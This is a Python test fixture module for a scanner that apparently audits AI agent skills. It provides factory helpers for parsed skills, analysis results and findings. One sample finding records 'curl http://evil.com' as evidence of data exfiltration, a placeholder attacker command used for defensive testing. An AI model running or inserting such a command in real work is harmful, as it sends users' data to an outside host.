"""Shared test fixtures and helpers for ASBOM tests."""

from __future__ import annotations

from pathlib import Path

from skillfortify.core.analyzer import AnalysisResult, Finding, Severity
from skillfortify.parsers.base import ParsedSkill


def make_skill(**kwargs: object) -> ParsedSkill:
    """Create a ParsedSkill with sensible defaults for testing."""
    defaults: dict[str, object] = dict(
        name="test-skill",
        version="1.0.0",
        source_path=Path("/tmp/skills/test"),
        format="claude",
        description="A test skill",
        instructions="",
        declared_capabilities=[],
        dependencies=[],
        code_blocks=[],
        urls=[],
        env_vars_referenced=[],
        shell_commands=[],
        raw_content="",
    )
    defaults.update(kwargs)
    return ParsedSkill(**defaults)  # type: ignore[arg-type]


def make_analysis(
    skill_name: str = "test-skill",
    is_safe: bool = True,
    findings: list[Finding] | None = None,
) -> AnalysisResult:
    """Create an AnalysisResult for testing."""
    return AnalysisResult(
        skill_name=skill_name,
        is_safe=is_safe,
        findings=findings or [],
    )


def make_finding(
    skill_name: str = "test-skill",
    severity: Severity = Severity.HIGH,
) -> Finding:
    return Finding(
        skill_name=skill_name,
        severity=severity,
        message="test finding",
        attack_class="data_exfiltration",
        finding_type="pattern_match",
        evidence="curl http://evil.com",
    )
